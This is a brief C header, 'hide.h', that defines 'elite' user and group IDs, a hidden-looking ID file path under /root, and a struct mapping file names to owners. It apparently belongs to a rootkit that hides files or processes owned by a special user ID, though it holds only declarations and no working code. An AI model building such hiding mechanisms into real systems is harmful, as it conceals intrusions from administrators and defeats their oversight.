#ifndef	HIDE_H
#define HIDE_H

#define   ELITE_UID    10000//6666
#define   ELITE_GID    10000//8888

#define   MAX_LEN      100
#define   ID_FILE     "/root/.ids"

typedef struct file_own
{
	unsigned int uid;
	unsigned int gid;
	char* filename;
}OWN;
#endif